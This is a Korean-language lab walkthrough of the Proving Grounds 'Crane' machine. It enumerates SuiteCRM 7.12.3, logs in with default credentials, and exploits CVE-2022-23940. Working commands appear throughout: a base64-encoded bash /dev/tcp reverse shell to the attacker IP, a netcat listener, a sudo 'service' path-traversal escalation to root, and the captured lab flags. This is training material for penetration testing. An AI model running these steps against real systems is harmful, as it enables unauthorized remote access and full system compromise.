---
tags:
  - type/machine
  - platform/pg
  - os/linux
  - status/solved
  - tech/lin/sudo-abuse
  - tech/lin/path-hijack
  - tech/web/sqli
  - tech/web/lfi-rfi
  - tech/web/webdav
  - tech/web/deserialization
  - tech/web/default-creds
  - tech/enum/dirbust
  - tech/enum/searchsploit
  - tech/payload/revshell
type: machine
platform: pg
os: linux
ip: 192.168.248.146
ports: [22, 80, 3306, 33060]
services: [http, mysql, mysqlx, ssh]
cves: [CVE-2022-23940]
status: solved
tech_count: 10
---
> [!info] PG Practice — Pentester Foundations #1
> **타겟** 192.168.248.146 · **OS** Debian 10 (buster) · **난이도** Intermediate
> **경로 요약** SuiteCRM 7.12.3 기본자격(admin:admin) → CVE-2022-23940 인증 후 RCE → `www-data` → `sudo service` 경로탈출 → `root`

### Nmap

```bash
┌──(kali㉿kali)-[~/PG/Crane]
└─$ sudo nmap -sCV -p- -Pn -A --min-rate 5000 -oN nmap.log 192.168.248.146
Nmap scan report for 192.168.248.146
Host is up (0.094s latency).
Not shown: 65531 closed tcp ports (reset)
PORT      STATE SERVICE VERSION
22/tcp    open  ssh     OpenSSH 7.9p1 Debian 10+deb10u2 (protocol 2.0)
| ssh-hostkey:
|   2048 37:80:01:4a:43:86:30:c9:79:e7:fb:7f:3b:a4:1e:dd (RSA)
|   256 b6:18:a1:e1:98:fb:6c:c6:87:55:45:10:c6:d4:45:b9 (ECDSA)
|_  256 ab:8f:2d:e8:a2:04:e7:b7:65:d3:fe:5e:93:1e:03:67 (ED25519)
80/tcp    open  http    Apache httpd 2.4.38 ((Debian))
| http-robots.txt: 1 disallowed entry
|_/
|_http-server-header: Apache/2.4.38 (Debian)
| http-title: SuiteCRM
|_Requested resource was index.php?action=Login&module=Users
| http-cookie-flags:
|   /:
|     PHPSESSID:
|_      httponly flag not set
3306/tcp  open  mysql   MySQL (unauthorized)
33060/tcp open  mysqlx  MySQL X protocol listener
Device type: general purpose|router
Running: Linux 5.X, MikroTik RouterOS 7.X
OS CPE: cpe:/o:linux:linux_kernel:5 cpe:/o:mikrotik:routeros:7 cpe:/o:linux:linux_kernel:5.6.3
OS details: Linux 5.0 - 5.14, MikroTik RouterOS 7.2 - 7.5 (Linux 5.6.3)
Network Distance: 4 hops
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

TRACEROUTE (using port 554/tcp)
HOP RTT      ADDRESS
1   93.59 ms 192.168.45.1
2   93.56 ms 192.168.45.254
3   93.70 ms 192.168.251.1
4   93.81 ms 192.168.248.146

Nmap done at Wed Aug 19 16:49:57 2026 -- 1 IP address (1 host up) scanned in 30.90 seconds
```

공격면은 사실상 **80번 하나**다. 3306은 원격 접속 허용 목록에 없어 `MySQL (unauthorized)`로 튕기고, SMB/NFS/RPC는 전수 스캔에서 전부 closed였다.

### 웹 열거 — 버전 확정

루트가 `index.php?action=Login&module=Users`로 301 리다이렉트, 타이틀은 `SuiteCRM`.
버전은 **인증 없이 REST API가 그대로 뱉는다** — 이게 가장 빠른 확정 경로다.

```bash
┌──(kali㉿kali)-[~/PG/Crane]
└─$ curl -s "http://192.168.248.146/service/v4_1/rest.php?method=get_server_info&input_type=JSON&response_type=JSON&rest_data=%7B%7D"
{"flavor":"CE","version":"6.5.25","suitecrm_version":"7.12.3","gmt_time":"2026-08-19 07:53:08"}
```

`/README.md` 1행(`# SuiteCRM 7.12.3`)으로 교차 확인. → **SuiteCRM 7.12.3 CE** (Sugar 6.5.25 기반)

> [!tip] 열거 포인트
> SuiteCRM은 `/service/v4_1/rest.php`의 `get_server_info`가 **비인증**이다. 버전 특정이 곧 CVE 특정이므로 SuiteCRM을 만나면 이걸 먼저 친다.

robots.txt:
```
User-agent: *
Disallow: /

User-agent: Googlebot
Allow: /ical_server.php
```

### feroxbuster

```bash
┌──(kali㉿kali)-[~/PG/Crane]
└─$ feroxbuster -u http://192.168.248.146/ -w /usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt -x php,txt,html,bak,zip -t 100 -o ferox.log
```

결과 1085행 대부분이 `themes/`·`cache/`·`vendor/` 정적 자산 노이즈다. 유의미한 것만:

```
301  GET  /  => index.php?action=Login&module=Users
301  GET  /custom, /vendor, /modules, /service, /custom/modules, /custom/application
301  GET  /modules/Administration, /modules/Home, /modules/Help
200  GET  /maintenance.php  (47c)
200  GET  /export.php, /pdf.php  (23c = "Not A Valid Entry Point")
200  GET  /service/v2/rest.php, /service/v4/rest.php, /service/v4_1/rest.php
200  GET  /service/v2/soap.php ~ /service/v4_1/soap.php
200  GET  /service/example/test.html, /service/example/example.html
401  GET  /ical_server.php   (X-Dav-Powered-By: HTTP_WebDAV_Server_iCal)
500  GET  /cron.php, /service/core/Sugar*.php, /service/v4{,_1}/registry.php
```

노출된 파일 중 눈여겨볼 것:

| 경로 | 상태 | 내용 |
|---|---|---|
| `/install/` | 200, **디렉터리 리스팅 활성** | `performSetup.php`, `dbConfig_a.php`, `siteConfig_a.php`, `status.json` 등 인스톨러 전체 |
| `/install/status.json` | 200 | 설치 완료 로그 + **내부 IP 172.16.201.78** 누출 |
| `/install.php` | 200 | `installer_locked => true` — 재설치 불가 |
| `/install.log` | 200, 51KB | 설치일 2023-08-24, DB 연결 실패 기록. **평문 자격증명 없음** |
| `/config.php`, `/config_override.php` | 200, 0바이트 | PHP 파싱됨, 유출 없음 |
| `/upload/` | 200 | 리스팅 없음 |

```json
// /install/status.json
{"message":"... Install finish...[ok]<br>Installation process finished, <a href=\"//172.16.201.78/index.php\">please log in...</a>",
 "command":{"function":"redirect","arguments":"//172.16.201.78/index.php"}}
```

인스톨러 노출은 눈에 띄지만 `installer_locked`가 걸려 있어 이 경로로는 못 들어간다. **함정에 가깝다.**

### searchsploit — 왜 DB 결과를 그대로 믿으면 안 되는가

```bash
┌──(kali㉿kali)-[~/PG/Crane]
└─$ searchsploit suitecrm
SuiteCRM 7.10.7  - 'parentTab' SQL Injection          | php/webapps/46310.txt
SuiteCRM 7.10.7  - 'record' SQL Injection             | php/webapps/46311.txt
SuiteCRM 7.11.15 - 'last_name' Remote Code Execution  | php/webapps/49001.py
SuiteCRM 7.11.18 - Remote Code Execution (RCE)        | php/webapps/50531.rb
```

전부 **7.12.3보다 낮은** 버전 대상이다. 타겟 버전 7.12.3에 맞는 것은 exploit-db가 아니라 **CVE-2022-23940** (7.12.5에서 패치) 쪽이고, GitHub PoC를 써야 한다.

> [!warning] 교훈
> `searchsploit`에 안 나온다고 취약점이 없는 게 아니다. 버전을 특정했으면 **CVE 번호로 다시 검색**한다.

### Foothold — 기본 자격증명 확인

CVE를 태우기 전에 로그인부터 확인한다. SuiteCRM 로그인 폼에는 `csrf_token`이 없어서 curl 한 방으로 검증된다.

```bash
┌──(kali㉿kali)-[~/PG/Crane]
└─$ curl -sS -i -X POST 'http://192.168.248.146/index.php' \
    -d 'module=Users&action=Authenticate&user_name=admin&username_password=admin&Login=Log+In'
HTTP/1.1 302 Found
Location: index.php?module=Home&action=index
```

`302 → module=Home` = 인증 성공. **admin:admin** 성립.

### CVE-2022-23940 — 인증 후 PHP 역직렬화 RCE

취약점 위치는 `AOR_Scheduled_Reports` 저장 로직이다. `email_recipients` 파라미터를 **base64 디코드한 뒤 검증 없이 `unserialize()`** 한다. SuiteCRM은 Monolog를 번들하고 있으므로 phpggc의 `Monolog/RCE2` 가젯 체인이 그대로 먹는다 — `Monolog\Handler\BufferHandler`의 소멸자 경로에서 `call_user_func('system', $cmd)`가 발화한다.

리스너를 tmux 세션으로 띄운다 (비대화식 SSH로 몰 때 셸이 안 끊긴다):

```bash
┌──(kali㉿kali)-[~/PG/Crane]
└─$ tmux new-session -d -s crane 'rlwrap nc -lvnp 4444'
```

페이로드를 base64로 감싼다 (익스플로잇 인자에 `&`, `>` 가 섞이면 깨지므로):

```bash
┌──(kali㉿kali)-[~/PG/Crane]
└─$ echo -n 'bash -i >& /dev/tcp/192.168.45.207/4444 0>&1' | base64 -w0
YmFzaCAtaSA+JiAvZGV2L3RjcC8xOTIuMTY4LjQ1LjIwNy80NDQ0IDA+JjE=
```

익스플로잇 실행:

```bash
┌──(kali㉿kali)-[~/PG/Crane]
└─$ git clone https://github.com/manuelz120/CVE-2022-23940.git
┌──(kali㉿kali)-[~/PG/Crane/CVE-2022-23940]
└─$ python3 exploit.py -h http://192.168.248.146 -u admin -p admin \
    -P 'echo YmFzaCAtaSA+JiAvZGV2L3RjcC8xOTIuMTY4LjQ1LjIwNy80NDQ0IDA+JjE= | base64 -d | bash'
INFO:CVE-2022-23940:Login did work - Trying to create scheduled report
```

> [!warning] 여기서 멈춘 것처럼 보인다 — 실패가 아니다
> 스크립트가 `Trying to create scheduled report`에서 그대로 굳고 결국 타임아웃된다.
> **역직렬화가 `Save` POST 처리 도중 인라인으로 발화**해서 리버스셸이 그 요청 안에서 붙어버리고, 그래서 HTTP 응답이 영영 반환되지 않기 때문이다.
> 스크립트 마지막의 `action=run` 트리거까지 갈 필요조차 없다. **스크립트가 아니라 리스너를 봐라.**

```bash
┌──(kali㉿kali)-[~/PG/Crane]
└─$ rlwrap nc -lvnp 4444
listening on [any] 4444 ...
connect to [192.168.45.207] from (UNKNOWN) [192.168.248.146] 36438
bash: cannot set terminal process group (610): Inappropriate ioctl for device
bash: no job control in this shell
www-data@crane:/var/www/html$ python3 -c "import pty;pty.spawn('/bin/bash')"
www-data@crane:/var/www/html$ export TERM=xterm
www-data@crane:/var/www/html$ id
uid=33(www-data) gid=33(www-data) groups=33(www-data)
www-data@crane:/var/www/html$ uname -a
Linux crane 4.19.0-24-amd64 #1 SMP Debian 4.19.282-1 (2023-04-29) x86_64 GNU/Linux
```

### user 플래그 — `/home`이 비어 있다

```bash
www-data@crane:/var/www/html$ ls -la /home/
total 8
drwxr-xr-x  2 root root 4096 Jun  6  2023 .
drwxr-xr-x 18 root root 4096 Jun 13  2023 ..

www-data@crane:/var/www/html$ find / -name local.txt 2>/dev/null
/var/www/local.txt

www-data@crane:/var/www/html$ cat /var/www/local.txt
dd091466af4faca653da308c6d836aa1
```

> [!tip] `/home`이 비었다고 당황하지 말 것
> 일반 유저 계정 없이 서비스 계정만 있는 박스에서는 플래그가 **서비스 홈 디렉터리**(`/var/www`)에 놓인다. `find / -name local.txt 2>/dev/null`을 반사적으로 친다.

### Privesc — `sudo service` 경로 탈출

```bash
www-data@crane:/var/www/html$ sudo -l
Matching Defaults entries for www-data on localhost:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin

User www-data may run the following commands on localhost:
    (ALL) NOPASSWD: /usr/sbin/service
```

`service`는 인자로 받은 서비스명을 `/etc/init.d/<이름>` 으로 이어붙여 실행한다. 이름에 상대경로를 넣으면 `/etc/init.d/` 밖으로 탈출해 임의 바이너리를 root로 띄울 수 있다 (GTFOBins `service`).

```bash
www-data@crane:/var/www/html$ sudo /usr/sbin/service ../../../../../bin/bash
root@crane:/# id
uid=0(root) gid=0(root) groups=0(root)
root@crane:/# cat /root/proof.txt
f92c362a87099978dbf8f3f108147934
```

`../../../../../bin/bash` → `/etc/init.d/../../../../../bin/bash` = `/bin/bash`. 상위 이동이 루트를 넘어가도 `/`에서 흡수되므로 개수는 넉넉히 넣으면 된다.

### 사후 수집

```bash
root@crane:/# grep suitecrm_version /var/www/html/suitecrm_version.php
$suitecrm_version = '7.12.3';

root@crane:/# grep -A8 dbconfig /var/www/html/config.php
  'dbconfig' =>
  array (
    'db_host_name' => 'localhost',
    'db_host_instance' => 'SQLEXPRESS',
    'db_user_name' => 'root',
    'db_password' => '',
    'db_name' => 'suitecrm',
    'db_type' => 'mysql',
```

DB가 `root` / 빈 패스워드지만 이미 시스템 root라 추가 활용은 불필요. (foothold를 못 잡았을 때의 대체 경로로 기억해둘 것)

---

## 플래그

| | |
|---|---|
| `local.txt` | `dd091466af4faca653da308c6d836aa1` |
| `proof.txt` | `f92c362a87099978dbf8f3f108147934` |

## OSCP 관점 정리

1. **버전 특정 → CVE 검색**이 전부인 박스다. `searchsploit`만 믿고 "7.12.3용 익스가 없다"고 접으면 끝난다. 비인증 REST(`get_server_info`)로 버전을 뽑고, CVE 번호로 GitHub PoC를 찾는 흐름을 몸에 익힐 것.
2. **기본 자격증명은 항상 먼저 시도한다.** `admin:admin` 한 번으로 인증 전제조건이 해결됐다.
3. **익스플로잇이 "행"에 걸린 것처럼 보여도 리스너를 먼저 확인**한다. 역직렬화·인라인 RCE 계열에서 흔한 착시다.
4. **`sudo -l`은 셸 잡자마자 무조건.** `service`, `tar`, `ruby`, `docker` 같은 GTFOBins 항목이 걸리면 그 즉시 끝난다.
5. `/install/` 디렉터리 리스팅과 내부 IP 누출(`172.16.201.78`)은 **함정**이었다 — `installer_locked`로 막혀 있다. 열려 보인다고 다 길은 아니다.

## 관련 노트

- [[01. Pentest Foundations]] — Crane 항목 (동일 경로 요약)
- [[Levram]] · [[Astronaut]] · [[Twiggy]] — 같은 Foundations 컬렉션
